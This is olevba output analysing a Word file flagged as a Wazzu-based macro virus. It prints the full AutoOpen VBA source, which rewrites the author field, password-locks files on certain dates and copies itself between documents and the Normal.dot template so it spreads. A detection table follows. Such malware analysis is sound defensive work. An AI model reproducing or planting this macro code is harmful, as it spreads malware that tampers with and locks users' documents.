olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-9457e0fabf712f3c8b9b7b402d9975fb9f766118
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-9457e0fabf712f3c8b9b7b402d9975fb9f766118 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Wazzu-based-9457e0fabf712f3c8b9b7b402d9975fb9f766118 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim TagNummer
Dim F$
Dim G$
Dim M$
On Error GoTo -1: On Error GoTo MinSize
WordBasic.FileSummaryInfo Author:="Acid_Burn"
TagNummer = WordBasic.Day(WordBasic.Now())
Select Case TagNummer
        Case 5, 10, 15, 20, 25, 30
            WordBasic.FileSaveAs WritePassword:="Assassins"
        Case Else
End Select
F$ = WordBasic.[FileName$]() + ":AutoOpen"
G$ = "Global:AutoOpen"
M$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If M$ = "NORMAL.DOT" Then
WordBasic.MacroCopy G$, F$
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy F$, G$
End If
MinSize:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

